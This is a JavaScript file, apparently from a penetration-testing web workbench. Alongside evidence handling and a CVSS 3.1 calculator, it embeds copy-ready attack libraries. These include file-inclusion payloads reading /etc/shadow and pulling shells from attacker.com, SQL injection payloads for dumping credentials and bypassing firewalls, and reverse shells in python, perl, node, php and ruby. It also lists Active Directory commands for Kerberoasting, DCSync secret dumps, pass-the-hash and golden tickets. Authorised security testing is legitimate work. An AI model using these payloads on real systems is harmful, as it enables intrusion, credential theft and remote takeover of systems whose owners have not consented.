    document.addEventListener('paste', (e) => {
        const panel = document.getElementById('panel-evidence');
        if (panel && !panel.classList.contains('hidden') && e.clipboardData?.files?.length) {
            e.preventDefault();
            Array.from(e.clipboardData.files).forEach(file => {
                if (!file.type.startsWith('image/')) return;
                const reader = new FileReader();
                reader.onload = () => {
                    evidenceFiles.push({ name: 'paste-' + Date.now() + '.png', type: file.type, size: file.size, dataUrl: reader.result, uploaded: new Date().toISOString(), finding_id: '' });
                    localStorage.setItem('spectra_evidence', JSON.stringify(evidenceFiles));
                    renderEvidenceGrid();
                };
                reader.readAsDataURL(file);
            });
        }
    });
}

function previewEvidence(idx) {
    const e = evidenceFiles[idx];
    if (!e) return;
    const isImage = /\.(png|jpg|jpeg|gif|webp|svg)$/i.test(e.name) || e.type?.startsWith('image/');
    const content = isImage
        ? `<img src="${e.dataUrl}" class="max-w-full max-h-[70vh] mx-auto block p-4">`
        : `<div class="p-8 text-center"><i data-lucide="file" class="w-10 h-10 inline-block text-slate-500 mb-3"></i><p class="text-slate-300">${escapeHtml(e.name)}</p><a href="${e.dataUrl}" download="${escapeHtml(e.name)}" class="mt-3 inline-block px-4 py-2 bg-violet-600 hover:bg-violet-500 text-white rounded-lg text-sm transition-colors">Download</a></div>`;
    showModal(e.name, content, 'max-w-4xl');
}

function removeEvidence(idx) {
    _spectraConfirm('Delete this evidence file?', () => {
        evidenceFiles.splice(idx, 1);
        localStorage.setItem('spectra_evidence', JSON.stringify(evidenceFiles));
        renderEvidenceGrid();
    }, { title: 'Delete Evidence' });
}

function filterEvidence() { renderEvidenceGrid(); }

function formatFileSize(bytes) {
    if (bytes < 1024) return bytes + ' B';
    if (bytes < 1048576) return (bytes / 1024).toFixed(1) + ' KB';
    return (bytes / 1048576).toFixed(1) + ' MB';
}

function timeAgo(date) {
    const s = Math.floor((Date.now() - date.getTime()) / 1000);
    if (s < 60) return s + 's ago';
    if (s < 3600) return Math.floor(s / 60) + 'm ago';
    if (s < 86400) return Math.floor(s / 3600) + 'h ago';
    return Math.floor(s / 86400) + 'd ago';
}

// ========== CVSS 3.1 CALCULATOR ==========
const cvssState = {};
const CVSS_WEIGHTS = {
    AV: {N:0.85,A:0.62,L:0.55,P:0.20},
    AC: {L:0.77,H:0.44},
    PR: {U:{N:0.85,L:0.62,H:0.27}, C:{N:0.85,L:0.68,H:0.50}},
    UI: {N:0.85,R:0.62},
    C:  {N:0,L:0.22,H:0.56},
    I:  {N:0,L:0.22,H:0.56},
    A:  {N:0,L:0.22,H:0.56},
};

function setCVSS(btn) {
    const group = btn.parentElement;
    const metric = group.dataset.cvss;
    const val = btn.dataset.val;
    group.querySelectorAll('.cvss-btn').forEach(b => b.classList.remove('active'));
    btn.classList.add('active');
    cvssState[metric] = val;
    calculateCVSS();
}

function calculateCVSS() {
    const required = ['AV','AC','PR','UI','S','C','I','A'];
    if (!required.every(m => cvssState[m])) {
        document.getElementById('cvss-score').textContent = '-';
        document.getElementById('cvss-severity').textContent = 'Select all metrics';
        document.getElementById('cvss-severity').className = 'text-sm font-bold mt-1 px-3 py-1 rounded inline-block text-slate-400';
        return;
    }

    const scopeChanged = cvssState.S === 'C';
    const av = CVSS_WEIGHTS.AV[cvssState.AV];
    const ac = CVSS_WEIGHTS.AC[cvssState.AC];
    const pr = CVSS_WEIGHTS.PR[scopeChanged ? 'C' : 'U'][cvssState.PR];
    const ui = CVSS_WEIGHTS.UI[cvssState.UI];
    const c = CVSS_WEIGHTS.C[cvssState.C];
    const i = CVSS_WEIGHTS.I[cvssState.I];
    const a = CVSS_WEIGHTS.A[cvssState.A];

    const iss = 1 - ((1 - c) * (1 - i) * (1 - a));
    let impact;
    if (scopeChanged) {
        impact = 7.52 * (iss - 0.029) - 3.25 * Math.pow(iss - 0.02, 15);
    } else {
        impact = 6.42 * iss;
    }

    if (impact <= 0) {
        updateCVSSDisplay(0);
        return;
    }

    const exploitability = 8.22 * av * ac * pr * ui;
    let score;
    if (scopeChanged) {
        score = Math.min(1.08 * (impact + exploitability), 10);
    } else {
        score = Math.min(impact + exploitability, 10);
    }
    score = Math.ceil(score * 10) / 10;
    updateCVSSDisplay(score);
}

function updateCVSSDisplay(score) {
    document.getElementById('cvss-score').textContent = score.toFixed(1);
    let severity, color, barColor;
    if (score === 0) { severity = 'NONE'; color = 'text-slate-400 bg-slate-500/10'; barColor = '#64748b'; }
    else if (score < 4) { severity = 'LOW'; color = 'text-emerald-400 bg-emerald-500/10'; barColor = '#34d399'; }
    else if (score < 7) { severity = 'MEDIUM'; color = 'text-amber-400 bg-amber-500/10'; barColor = '#fbbf24'; }
    else if (score < 9) { severity = 'HIGH'; color = 'text-orange-400 bg-orange-500/10'; barColor = '#fb923c'; }
    else { severity = 'CRITICAL'; color = 'text-rose-400 bg-rose-500/10'; barColor = '#f43f5e'; }

    document.getElementById('cvss-severity').textContent = severity;
    document.getElementById('cvss-severity').className = 'text-sm font-bold mt-1 px-3 py-1 rounded inline-block ' + color;
    document.getElementById('cvss-bar').style.width = (score * 10) + '%';
    document.getElementById('cvss-bar').style.background = barColor;

    const vector = 'CVSS:3.1/AV:' + (cvssState.AV||'?') + '/AC:' + (cvssState.AC||'?') + '/PR:' + (cvssState.PR||'?') +
        '/UI:' + (cvssState.UI||'?') + '/S:' + (cvssState.S||'?') + '/C:' + (cvssState.C||'?') + '/I:' + (cvssState.I||'?') + '/A:' + (cvssState.A||'?');
    document.getElementById('cvss-vector-display').textContent = vector;
}

function copyCVSSVector() {
    const v = document.getElementById('cvss-vector-display').textContent;
    navigator.clipboard.writeText(v);
}

function parseCVSSVector() {
    const input = document.getElementById('cvss-vector-input').value.trim();
    const match = input.match(/CVSS:3\.[01]\/AV:([NALP])\/AC:([LH])\/PR:([NLH])\/UI:([NR])\/S:([UC])\/C:([NLH])\/I:([NLH])\/A:([NLH])/);
    if (!match) { _spectraToast('Invalid CVSS vector string', 'error'); return; }
    const [, av, ac, pr, ui, s, c, i, a] = match;
    const vals = {AV:av, AC:ac, PR:pr, UI:ui, S:s, C:c, I:i, A:a};
    Object.entries(vals).forEach(([metric, val]) => {
        const group = document.querySelector(`[data-cvss="${metric}"]`);
        if (!group) return;
        group.querySelectorAll('.cvss-btn').forEach(b => {
            b.classList.toggle('active', b.dataset.val === val);
        });
        cvssState[metric] = val;
    });
    calculateCVSS();
}

// ========== LFI/RFI PAYLOADS ==========
const LFI_PAYLOADS = [
    {cat:'Basic LFI', os:'linux', payload:'../../../etc/passwd', desc:'Read passwd file'},
    {cat:'Basic LFI', os:'linux', payload:'../../../etc/shadow', desc:'Read shadow file (need root)'},
    {cat:'Basic LFI', os:'linux', payload:'../../../etc/hosts', desc:'Read hosts file'},
    {cat:'Basic LFI', os:'linux', payload:'../../../proc/self/environ', desc:'Process environment variables'},
    {cat:'Basic LFI', os:'linux', payload:'../../../proc/self/cmdline', desc:'Process command line'},
    {cat:'Basic LFI', os:'linux', payload:'../../../var/log/auth.log', desc:'Auth logs (log poisoning)'},
    {cat:'Basic LFI', os:'linux', payload:'../../../var/log/apache2/access.log', desc:'Apache access log'},
    {cat:'Basic LFI', os:'windows', payload:'..\\..\\..\\windows\\system32\\drivers\\etc\\hosts', desc:'Windows hosts file'},
    {cat:'Basic LFI', os:'windows', payload:'..\\..\\..\\windows\\win.ini', desc:'Windows ini file'},
    {cat:'Basic LFI', os:'windows', payload:'..\\..\\..\\windows\\system.ini', desc:'System ini file'},
    {cat:'Null Byte', os:'linux', payload:'../../../etc/passwd%00', desc:'Null byte bypass (PHP < 5.3)'},
    {cat:'Null Byte', os:'linux', payload:'../../../etc/passwd%00.png', desc:'Null byte with extension'},
    {cat:'Double Encoding', os:'linux', payload:'..%252f..%252f..%252fetc/passwd', desc:'Double URL encode ../'},
    {cat:'Double Encoding', os:'linux', payload:'%252e%252e%252f%252e%252e%252fetc/passwd', desc:'Full double encode'},
    {cat:'Filter Bypass', os:'linux', payload:'....//....//....//etc/passwd', desc:'Double dot bypass'},
    {cat:'Filter Bypass', os:'linux', payload:'..;/..;/..;/etc/passwd', desc:'Semicolon bypass (Tomcat)'},
    {cat:'Filter Bypass', os:'linux', payload:'/..\\..\\..\\etc/passwd', desc:'Backslash bypass'},
    {cat:'PHP Wrappers', os:'linux', payload:'php://filter/convert.base64-encode/resource=index.php', desc:'Read PHP source (base64)'},
    {cat:'PHP Wrappers', os:'linux', payload:'php://input', desc:'PHP input stream (POST data exec)'},
    {cat:'PHP Wrappers', os:'linux', payload:'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+', desc:'Data wrapper RCE'},
    {cat:'PHP Wrappers', os:'linux', payload:'expect://id', desc:'Expect wrapper (if enabled)'},
    {cat:'RFI', os:'linux', payload:'http://attacker.com/shell.txt', desc:'Basic RFI'},
    {cat:'RFI', os:'linux', payload:'http://attacker.com/shell.txt%00', desc:'RFI with null byte'},
    {cat:'RFI', os:'linux', payload:'\\\\attacker.com\\share\\shell.php', desc:'UNC path RFI (Windows)'},
];
let lfiOSFilter = 'all';

function initLFI() { renderLFI(); }

function renderLFI() {
    const search = (document.getElementById('lfi-search')?.value || '').toLowerCase();
    let filtered = LFI_PAYLOADS;
    if (lfiOSFilter !== 'all') filtered = filtered.filter(p => p.os === lfiOSFilter);
    if (search) filtered = filtered.filter(p => p.payload.toLowerCase().includes(search) || p.desc.toLowerCase().includes(search) || p.cat.toLowerCase().includes(search));

    let currentCat = '';
    let html = '';
    filtered.forEach(p => {
        if (p.cat !== currentCat) {
            currentCat = p.cat;
            html += `<div class="text-xs font-bold uppercase text-slate-500 mt-3 mb-1">${escapeHtml(currentCat)}</div>`;
        }
        const osColor = p.os === 'linux' ? 'text-emerald-400' : 'text-blue-400';
        html += `<div class="payload-row flex items-center gap-2 px-2 py-1.5 rounded text-xs cursor-pointer" onclick="navigator.clipboard.writeText('${escapeAttr(p.payload)}')">
            <span class="${osColor} text-xs uppercase w-12 shrink-0">${p.os}</span>
            <code class="text-violet-300 font-mono flex-1 truncate">${escapeHtml(p.payload)}</code>
            <span class="text-slate-500 text-xs shrink-0 truncate max-w-[150px]">${escapeHtml(p.desc)}</span>
            <span class="copy-btn text-slate-400 text-xs"><i data-lucide="copy" class="w-3.5 h-3.5 inline-block"></i></span>
        </div>`;
    });
    document.getElementById('lfi-list').innerHTML = html || '<div class="text-slate-500 text-xs py-4 text-center">No payloads found</div>';
    if (typeof lucide !== 'undefined') lucide.createIcons();
}

function filterLFI() { renderLFI(); }
function filterLFIOS(os) {
    lfiOSFilter = os;
    document.querySelectorAll('.lfi-os-btn').forEach(b => {
        b.className = b.dataset.os === os ? 'lfi-os-btn px-2 py-1 rounded text-[11px] bg-violet-600 text-white' : 'lfi-os-btn px-2 py-1 rounded text-[11px] bg-slate-800 text-slate-300 border border-white/5';
    });
    renderLFI();
}

// ========== SQL INJECTION PAYLOADS ==========
const SQLI_PAYLOADS = [
    {cat:'Detection', payload:"' OR '1'='1", desc:'Basic OR true'},
    {cat:'Detection', payload:"' OR '1'='1'--", desc:'OR true with comment'},
    {cat:'Detection', payload:"' OR 1=1#", desc:'OR true MySQL comment'},
    {cat:'Detection', payload:"1' ORDER BY 1--+", desc:'Column count detection'},
    {cat:'Detection', payload:"' AND 1=1--", desc:'Boolean true test'},
    {cat:'Detection', payload:"' AND 1=2--", desc:'Boolean false test'},
    {cat:'Detection', payload:"' AND SLEEP(5)--", desc:'Time-based blind test'},
    {cat:'UNION', payload:"' UNION SELECT NULL--", desc:'UNION 1 column'},
    {cat:'UNION', payload:"' UNION SELECT NULL,NULL--", desc:'UNION 2 columns'},
    {cat:'UNION', payload:"' UNION SELECT NULL,NULL,NULL--", desc:'UNION 3 columns'},
    {cat:'UNION', payload:"' UNION SELECT username,password FROM users--", desc:'Extract credentials'},
    {cat:'UNION', payload:"' UNION SELECT table_name,NULL FROM information_schema.tables--", desc:'List tables'},
    {cat:'UNION', payload:"' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--", desc:'List columns'},
    {cat:'Blind', payload:"' AND (SELECT SUBSTRING(username,1,1) FROM users LIMIT 1)='a'--", desc:'Char-by-char extraction'},
    {cat:'Blind', payload:"' AND IF(1=1,SLEEP(5),0)--", desc:'MySQL time-based'},
    {cat:'Blind', payload:"'; WAITFOR DELAY '0:0:5'--", desc:'MSSQL time-based'},
    {cat:'Error-based', payload:"' AND EXTRACTVALUE(0x0a,CONCAT(0x0a,(SELECT database())))--", desc:'MySQL error-based'},
    {cat:'Error-based', payload:"' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--", desc:'MSSQL error-based'},
    {cat:'Error-based', payload:"' AND 1=CAST((SELECT version()) AS int)--", desc:'PostgreSQL error-based'},
    {cat:'WAF Bypass', payload:"/*!50000UNION*//*!50000SELECT*/1,2,3", desc:'MySQL version comment'},
    {cat:'WAF Bypass', payload:"' UNI/**/ON SEL/**/ECT 1,2,3--", desc:'Inline comment bypass'},
    {cat:'WAF Bypass', payload:"' %55nion %53elect 1,2,3--", desc:'URL-encoded keywords'},
    {cat:'WAF Bypass', payload:"' uNiOn aLl sElEcT 1,2,3--", desc:'Case variation'},
    {cat:'WAF Bypass', payload:"' || '1'='1", desc:'OR alternative syntax'},
];
const SQLI_CATEGORIES = ['All','Detection','UNION','Blind','Error-based','WAF Bypass'];
let sqliCatFilter = 'All';

function initSQLi() {
    document.getElementById('sqli-cat-filters').innerHTML = SQLI_CATEGORIES.map(c =>
        `<button class="sqli-cat-btn px-2 py-1 rounded text-[11px] transition-colors ${c === 'All' ? 'bg-violet-600 text-white' : 'bg-slate-800 text-slate-300 border border-white/5'}" data-cat="${c}" onclick="filterSQLiCat('${c}')">${c}</button>`
    ).join('');
    renderSQLi();
}

function renderSQLi() {
    const search = (document.getElementById('sqli-search')?.value || '').toLowerCase();
    let filtered = SQLI_PAYLOADS;
    if (sqliCatFilter !== 'All') filtered = filtered.filter(p => p.cat === sqliCatFilter);
    if (search) filtered = filtered.filter(p => p.payload.toLowerCase().includes(search) || p.desc.toLowerCase().includes(search));

    let currentCat = '';
    let html = '';
    filtered.forEach(p => {
        if (p.cat !== currentCat) { currentCat = p.cat; html += `<div class="text-xs font-bold uppercase text-slate-500 mt-3 mb-1">${escapeHtml(currentCat)}</div>`; }
        html += `<div class="payload-row flex items-center gap-2 px-2 py-1.5 rounded text-xs cursor-pointer" onclick="navigator.clipboard.writeText(this.querySelector('code').textContent)">
            <code class="text-rose-300 font-mono flex-1 truncate">${escapeHtml(p.payload)}</code>
            <span class="text-slate-500 text-xs shrink-0 truncate max-w-[200px]">${escapeHtml(p.desc)}</span>
            <span class="copy-btn text-slate-400 text-xs"><i data-lucide="copy" class="w-3.5 h-3.5 inline-block"></i></span>
        </div>`;
    });
    document.getElementById('sqli-list').innerHTML = html || '<div class="text-slate-500 text-xs py-4 text-center">No payloads found</div>';
    if (typeof lucide !== 'undefined') lucide.createIcons();
}

function filterSQLi() { renderSQLi(); }
function filterSQLiCat(cat) {
    sqliCatFilter = cat;
    document.querySelectorAll('.sqli-cat-btn').forEach(b => {
        b.className = b.dataset.cat === cat ? 'sqli-cat-btn px-2 py-1 rounded text-[11px] bg-violet-600 text-white' : 'sqli-cat-btn px-2 py-1 rounded text-[11px] bg-slate-800 text-slate-300 border border-white/5';
    });
    renderSQLi();
}

// ========== PRIVILEGE ESCALATION (GTFOBins) ==========
const GTFOBINS = [
    {bin:'python3', fns:['shell','suid','sudo','file-read','reverse-shell'], cmds:{shell:"python3 -c 'import os; os.system(\"/bin/sh\")'", suid:"python3 -c 'import os; os.execl(\"/bin/sh\",\"sh\",\"-p\")'", sudo:"sudo python3 -c 'import os; os.system(\"/bin/sh\")'", 'file-read':"python3 -c 'print(open(\"FILE\").read())'", 'reverse-shell':"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"IP\",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"}},
    {bin:'perl', fns:['shell','sudo','reverse-shell'], cmds:{shell:"perl -e 'exec \"/bin/sh\";'", sudo:"sudo perl -e 'exec \"/bin/sh\";'", 'reverse-shell':"perl -e 'use Socket;$i=\"IP\";$p=PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'"}},
    {bin:'find', fns:['shell','suid','sudo'], cmds:{shell:"find . -exec /bin/sh -p \\; -quit", suid:"find / -perm -4000 -exec /bin/sh -p \\; -quit", sudo:"sudo find . -exec /bin/sh \\; -quit"}},
    {bin:'vim', fns:['shell','suid','sudo','file-read','file-write'], cmds:{shell:"vim -c ':!/bin/sh'", suid:"vim -c ':py3 import os; os.execl(\"/bin/sh\",\"sh\",\"-pc\",\"sh\")'", sudo:"sudo vim -c ':!/bin/sh'", 'file-read':"vim FILE", 'file-write':"vim FILE (then :w)"}},
    {bin:'nmap', fns:['shell','sudo'], cmds:{shell:"nmap --interactive\\nnmap> !sh", sudo:"sudo nmap --interactive\\nnmap> !sh"}},
    {bin:'awk', fns:['shell','suid','sudo','file-read'], cmds:{shell:"awk 'BEGIN {system(\"/bin/sh\")}'", suid:"awk 'BEGIN {system(\"/bin/sh -p\")}'", sudo:"sudo awk 'BEGIN {system(\"/bin/sh\")}'", 'file-read':"awk '{print}' FILE"}},
    {bin:'less', fns:['shell','sudo','file-read'], cmds:{shell:"less /etc/passwd\\n!/bin/sh", sudo:"sudo less /etc/passwd\\n!/bin/sh", 'file-read':"less FILE"}},
    {bin:'more', fns:['shell','sudo','file-read'], cmds:{shell:"more /etc/passwd\\n!/bin/sh", sudo:"sudo more /etc/passwd\\n!/bin/sh", 'file-read':"TERM= more FILE"}},
    {bin:'tar', fns:['shell','sudo'], cmds:{shell:"tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh", sudo:"sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh"}},
    {bin:'bash', fns:['shell','suid','sudo'], cmds:{shell:"/bin/bash", suid:"bash -p", sudo:"sudo bash"}},
    {bin:'cp', fns:['suid','sudo','file-write'], cmds:{suid:"cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p", sudo:"sudo cp /etc/shadow /tmp/shadow", 'file-write':"cp PAYLOAD TARGET"}},
    {bin:'chmod', fns:['suid','sudo'], cmds:{suid:"chmod +s /bin/bash", sudo:"sudo chmod +s /bin/bash"}},
    {bin:'env', fns:['shell','sudo'], cmds:{shell:"env /bin/sh", sudo:"sudo env /bin/sh"}},
    {bin:'node', fns:['shell','sudo','reverse-shell'], cmds:{shell:"node -e 'require(\"child_process\").spawn(\"/bin/sh\",[\"-i\"],{stdio:[0,1,2]})'", sudo:"sudo node -e 'require(\"child_process\").spawn(\"/bin/sh\",{stdio:[0,1,2]})'", 'reverse-shell':"node -e '(function(){var c=require(\"child_process\").spawn(\"/bin/sh\",[]);var s=require(\"net\").connect(PORT,\"IP\",function(){c.stdin.pipe(s);s.pipe(c.stdout);s.pipe(c.stderr)})})();'"}},
    {bin:'php', fns:['shell','sudo','file-read','reverse-shell'], cmds:{shell:"php -r 'system(\"/bin/sh\");'", sudo:"sudo php -r 'system(\"/bin/sh\");'", 'file-read':"php -r 'echo file_get_contents(\"FILE\");'", 'reverse-shell':"php -r '$sock=fsockopen(\"IP\",PORT);exec(\"/bin/sh -i <&3 >&3 2>&3\");'"}},
    {bin:'ruby', fns:['shell','sudo','reverse-shell'], cmds:{shell:"ruby -e 'exec \"/bin/sh\"'", sudo:"sudo ruby -e 'exec \"/bin/sh\"'", 'reverse-shell':"ruby -rsocket -e 'f=TCPSocket.open(\"IP\",PORT).to_i;exec sprintf(\"/bin/sh -i <&%d >&%d 2>&%d\",f,f,f)'"}},
    {bin:'wget', fns:['file-write'], cmds:{'file-write':"wget http://attacker.com/payload -O /target/path"}},
    {bin:'curl', fns:['file-read','file-write'], cmds:{'file-read':"curl file:///etc/passwd", 'file-write':"curl http://attacker.com/payload -o /target/path"}},
];
const PRIVESC_FUNCTIONS = ['All','shell','suid','sudo','file-read','file-write','reverse-shell'];
let privescFnFilter = 'All';

function initPrivEsc() {
    document.getElementById('privesc-fn-filters').innerHTML = PRIVESC_FUNCTIONS.map(f =>
        `<button class="privesc-fn-btn px-2 py-1 rounded text-[11px] transition-colors ${f === 'All' ? 'bg-violet-600 text-white' : 'bg-slate-800 text-slate-300 border border-white/5'}" data-fn="${f}" onclick="filterPrivEscFn('${f}')">${f === 'All' ? 'All' : f.charAt(0).toUpperCase() + f.slice(1).replace('-',' ')}</button>`
    ).join('');
    renderPrivEsc();
}

function renderPrivEsc() {
    const search = (document.getElementById('privesc-search')?.value || '').toLowerCase();
    let filtered = GTFOBINS;
    if (privescFnFilter !== 'All') filtered = filtered.filter(b => b.fns.includes(privescFnFilter));
    if (search) filtered = filtered.filter(b => b.bin.toLowerCase().includes(search));

    document.getElementById('privesc-list').innerHTML = filtered.map(b => {
        const fnBadges = b.fns.map(f => {
            const colors = {shell:'bg-emerald-500/20 text-emerald-400', suid:'bg-rose-500/20 text-rose-400', sudo:'bg-amber-500/20 text-amber-400', 'file-read':'bg-blue-500/20 text-blue-400', 'file-write':'bg-violet-500/20 text-violet-400', 'reverse-shell':'bg-pink-500/20 text-pink-400'};
            return `<span class="px-1.5 py-0.5 rounded text-xs ${colors[f] || 'bg-slate-500/20 text-slate-400'}">${f}</span>`;
        }).join('');
        const cmds = Object.entries(b.cmds).map(([fn, cmd]) =>
            `<div class="mt-1"><span class="text-xs text-slate-500 uppercase">${fn}:</span>
            <div class="flex items-center gap-1 mt-0.5"><code class="text-[11px] text-violet-300 font-mono bg-black/30 rounded px-1.5 py-0.5 flex-1 truncate">${escapeHtml(cmd)}</code>
            <button onclick="event.stopPropagation();navigator.clipboard.writeText('${escapeAttr(cmd)}')" class="text-slate-400 hover:text-white text-xs shrink-0 px-1"><i data-lucide="copy" class="w-3.5 h-3.5 inline-block"></i></button></div></div>`
        ).join('');
        return `<div class="border border-white/5 rounded-lg p-3 bg-slate-800/30">
            <div class="flex items-center gap-2 mb-2">
                <span class="text-sm font-bold text-white font-mono">${escapeHtml(b.bin)}</span>
            </div>
            <div class="flex flex-wrap gap-1 mb-2">${fnBadges}</div>
            <div class="space-y-1">${cmds}</div>
        </div>`;
    }).join('') || '<div class="text-slate-500 text-xs py-4 text-center col-span-full">No binaries found</div>';
    if (typeof lucide !== 'undefined') lucide.createIcons();
}

function filterPrivEsc() { renderPrivEsc(); }
function filterPrivEscFn(fn) {
    privescFnFilter = fn;
    document.querySelectorAll('.privesc-fn-btn').forEach(b => {
        b.className = b.dataset.fn === fn ? 'privesc-fn-btn px-2 py-1 rounded text-[11px] bg-violet-600 text-white' : 'privesc-fn-btn px-2 py-1 rounded text-[11px] bg-slate-800 text-slate-300 border border-white/5';
    });
    renderPrivEsc();
}

// ========== AD ENUMERATION ==========
const AD_SECTIONS = [
    {name:'Initial Enumeration', cmds:[
        {cmd:'crackmapexec smb {dc} --shares', desc:'Enumerate SMB shares'},
        {cmd:'crackmapexec smb {dc} --users', desc:'Enumerate domain users'},
        {cmd:'crackmapexec smb {dc} --groups', desc:'Enumerate domain groups'},
        {cmd:'enum4linux -a {dc}', desc:'Full enum4linux scan'},
        {cmd:'ldapsearch -x -H ldap://{dc} -b "DC={domain_parts}" "(objectClass=user)"', desc:'LDAP user enumeration'},
        {cmd:'nmap -p 88,135,139,389,445,636,3268 {dc}', desc:'Scan AD-related ports'},
        {cmd:'rpcclient -U "" -N {dc}', desc:'Null session RPC'},
        {cmd:'smbclient -L //{dc} -N', desc:'List SMB shares (null session)'},
    ]},
    {name:'Kerberos Attacks', cmds:[
        {cmd:'impacket-GetNPUsers {domain}/ -usersfile users.txt -no-pass -dc-ip {dc}', desc:'AS-REP Roasting'},
        {cmd:'impacket-GetUserSPNs {domain}/{user}:{pass} -dc-ip {dc} -request', desc:'Kerberoasting'},
        {cmd:'kerbrute userenum --dc {dc} -d {domain} users.txt', desc:'Username enumeration via Kerberos'},
        {cmd:'kerbrute passwordspray --dc {dc} -d {domain} users.txt {pass}', desc:'Password spraying'},
        {cmd:'impacket-ticketer -nthash HASH -domain-sid S-1-5-... -domain {domain} Administrator', desc:'Golden ticket'},
    ]},
    {name:'Credential Attacks', cmds:[
        {cmd:'impacket-secretsdump {domain}/{user}:{pass}@{dc}', desc:'DCSync / dump secrets'},
        {cmd:'crackmapexec smb {dc} -u {user} -p {pass} --sam', desc:'Dump SAM database'},
        {cmd:'crackmapexec smb {dc} -u {user} -p {pass} --lsa', desc:'Dump LSA secrets'},
        {cmd:'crackmapexec smb {dc} -u {user} -H NTHASH --pass-the-hash', desc:'Pass the hash'},
        {cmd:'impacket-ntlmrelayx -tf targets.txt -smb2support', desc:'NTLM relay attack'},
    ]},
    {name:'Lateral Movement', cmds:[
        {cmd:'impacket-psexec {domain}/{user}:{pass}@{dc}', desc:'PSExec remote shell'},
        {cmd:'impacket-wmiexec {domain}/{user}:{pass}@{dc}', desc:'WMI remote execution'},
        {cmd:'impacket-smbexec {domain}/{user}:{pass}@{dc}', desc:'SMB exec remote shell'},
        {cmd:'evil-winrm -i {dc} -u {user} -p {pass}', desc:'WinRM shell'},
        {cmd:'crackmapexec smb {dc} -u {user} -p {pass} -x "whoami"', desc:'Remote command execution'},
    ]},
    {name:'Privilege Escalation', cmds:[
        {cmd:'bloodhound-python -u {user} -p {pass} -d {domain} -dc {dc} -c All', desc:'BloodHound collection'},
        {cmd:'impacket-findDelegation {domain}/{user}:{pass} -dc-ip {dc}', desc:'Find delegation rights'},
        {cmd:'crackmapexec ldap {dc} -u {user} -p {pass} -M laps', desc:'LAPS password extraction'},
        {cmd:'impacket-rbcd -delegate-to TARGET$ -action write {domain}/{user}:{pass}', desc:'RBCD attack'},
    ]},
];

function renderADCommands() {
    const domain = document.getElementById('ad-domain')?.value || 'DOMAIN';
    const user = document.getElementById('ad-user')?.value || 'user';
    const pass = document.getElementById('ad-pass')?.value || 'password';
    const dc = document.getElementById('ad-dc')?.value || '10.10.10.10';
    const domainParts = domain.split('.').map(p => 'DC=' + p).join(',');

    document.getElementById('adenum-list').innerHTML = AD_SECTIONS.map(section => {
        const cmds = section.cmds.map(c => {
            const resolved = c.cmd.replace(/\{domain\}/g, domain).replace(/\{user\}/g, user).replace(/\{pass\}/g, pass).replace(/\{dc\}/g, dc).replace(/\{domain_parts\}/g, domainParts);
            return `<div class="payload-row flex items-center gap-2 px-2 py-1.5 rounded text-xs">
                <code class="text-violet-300 font-mono flex-1 truncate">${escapeHtml(resolved)}</code>
                <span class="text-slate-500 text-xs shrink-0 truncate max-w-[180px]">${escapeHtml(c.desc)}</span>
                <button onclick="navigator.clipboard.writeText(this.closest('.payload-row').querySelector('code').textContent)" class="copy-btn text-slate-400 hover:text-white text-xs shrink-0"><i data-lucide="copy" class="w-3.5 h-3.5 inline-block"></i></button>
            </div>`;
        }).join('');
        return `<div class="border border-white/5 rounded-lg overflow-hidden">
            <button onclick="toggleAccordion(this)" class="w-full flex items-center justify-between px-4 py-2.5 bg-slate-800/50 hover:bg-slate-800 text-left transition-colors">
                <span class="text-xs font-medium text-white">${escapeHtml(section.name)}</span>
                <i data-lucide="chevron-down" class="w-3.5 h-3.5 inline-block text-slate-500 transition-transform"></i>
            </button>
            <div class="accordion-content open"><div class="p-2 space-y-0.5">${cmds}</div></div>
        </div>`;
    }).join('');
    if (typeof lucide !== 'undefined') lucide.createIcons();
}
const debouncedFilterTools = debounce(filterTools);
const debouncedFilterHistory = debounce(filterHistory);
const debouncedFilterPorts = debounce(filterPorts);
const debouncedFilterLFI = debounce(filterLFI);
const debouncedFilterSQLi = debounce(filterSQLi);
const debouncedFilterPrivEsc = debounce(filterPrivEsc);

// Expose functions to global scope for HTML event handlers
window.switchManualTab = switchManualTab;
window.nextTip = nextTip;
window.startSession = startSession;
window.exportSession = exportSession;
window.toggleScopePanel = toggleScopePanel;
window.addScopeTarget = addScopeTarget;
window.addScopeExclusion = addScopeExclusion;
window.saveScope = saveScope;
window.quickRun = quickRun;
window.debouncedFilterTools = debouncedFilterTools;
window.executeManualTool = executeManualTool;
window.clearOutput = clearOutput;
window.openDiffModal = openDiffModal;
window.toggleHistoryPanel = toggleHistoryPanel;
window.debouncedFilterHistory = debouncedFilterHistory;
window.filterHistory = filterHistory;
window.sortHistory = sortHistory;
window.addPipelineStep = addPipelineStep;
window.runPipeline = runPipeline;
window.loadPipelineTemplate = loadPipelineTemplate;
window.searchCVEs = searchCVEs;
window.loadChecklist = loadChecklist;
window.resetChecklist = resetChecklist;
window.filterNotes = filterNotes;
window.createNote = createNote;
window.wrapNoteText = wrapNoteText;
window.toggleNotePreview = toggleNotePreview;
window.onNoteEdit = onNoteEdit;
window.deleteNote = deleteNote;
window.saveCurrentNote = saveCurrentNote;
window.uploadEvidence = uploadEvidence;
window.pasteEvidence = pasteEvidence;
window.filterEvidence = filterEvidence;
window.switchHelperTab = switchHelperTab;
window.copyToClipboard = copyToClipboard;
window.copyListenerCmd = copyListenerCmd;
window.debouncedFilterPorts = debouncedFilterPorts;
window.loadWordlists = loadWordlists;
window.uploadWordlist = uploadWordlist;
window.setCVSS = setCVSS;
window.parseCVSSVector = parseCVSSVector;
window.copyCVSSVector = copyCVSSVector;
window.debouncedFilterLFI = debouncedFilterLFI;
window.filterLFIOS = filterLFIOS;
window.debouncedFilterSQLi = debouncedFilterSQLi;
